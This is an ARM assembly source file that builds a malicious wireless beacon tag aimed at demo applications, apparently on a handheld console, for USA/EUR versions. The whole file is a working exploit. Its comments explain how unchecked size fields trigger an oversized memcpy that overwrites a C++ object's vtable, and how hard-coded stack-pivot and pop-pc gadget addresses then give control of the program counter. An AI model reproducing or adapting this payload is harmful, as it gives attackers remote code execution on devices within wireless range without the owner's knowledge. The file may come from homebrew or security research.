.arm
.section .init
.global _start

//USA/EUR demos(unknown if these are valid for JPN demo):
#define ADDITIONALDATA_ADR 0x00c9d7d0
#define STACKPIVOT_ADR 0x0012a4f4 //This stack-pivot gadget also exists in spider.
#define POP_PC 0x0010b930

#define POP_LRPC STACKPIVOT_ADR+0x8

@ Beacon tag data for OUI-type 0x15, big-endian.

_start:
.byte 0x00, 0x1f, 0x32 @ OUI / first 0x1F-bytes of network-struct+0xC.
.byte 0x15 @ OUI type
.byte 0x00, 0x14, 0xC1, 0x10 @ wlancommID, the ID used here is for the demos.
.byte 0x00 @ u8 ID
.byte 0x90, 0x80, 0x00
.byte 0xB3, 0x20, 0x6F, 0x07 @ random u32
.byte 0x01, 04, 0x00, 0x01
.byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
.word 0, 0, 0, 0, 0 @ SHA1 hash
.byte 0xb8 @ Size of the following additional-data.

@ Title-specific additional-data(little-endian):

@ Neither of the below size fields are checked. In memory, the second data-block used with size1 for the memcpy is copied to: adr = buf0adr+size0 + (<value of s8 at additionaldata+0x2> * size1). Therefore, the size and the relative offset for the destination buffer can be controlled.
@ This is used to trigger a memcpy with size 0x1898 with the data @ additionaldata+0x34, which then overwrites a c++ object. See below.

.byte 0xff, 0xff
.byte 0x04 @ s8, index?
.byte 0xff
.byte 0xff, 0xff, 0xff, 0xff
.word 0x4 @ additionaldata+0x8, u32 size0. Normally this is 0x22, however with this haxx value 0x04 is used so that more space is available in the second block.
.word 0x18A0 @ additionaldata+0xc, u32 size1
.word 0xffffffff @ additionaldata+0x10. The data used with size0 for the memcpy begins here. The data used with the memcpy for size1 is located immediately after this block.
.word ADDITIONALDATA_ADR @ additionaldata+0x14. Beginning of data which overwrites the c++ object. The ptr here overwrites the vtable ptr, therefore the vtable addr is overwritten with <addr of additionaldata+0>. (r0)
.word 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff @ additionaldata+0x18 / object+0x4. (r1-r4)
.word 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff @ additionaldata+0x28 / object+0x14. (r5-r8)
.word 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff @ additionaldata+0x38 / object+0x24. (r9, sl, fp, ip)
.word ADDITIONALDATA_ADR+0x14+0x40 @ sp
.word POP_PC @ lr
.word POP_PC @ pc

@ Stack begins here. Once the stack-pivot finishes, sp will be set to here, and "pop {pc}" will be executed.
.word 0x58584148

.fill ((_start + 0x34+0x90) - .), 1, 0xffffffff
.word STACKPIVOT_ADR @ additionaldata+0x90. The application calls vtable funcptr +0x90 from the object overwritten above, after the haxx triggers. This results in control of PC(the data located at r0 is also controlled since that's the data overwritten by the above).

.fill ((_start + 0x34+0xb8) - .), 1, 0xffffffff

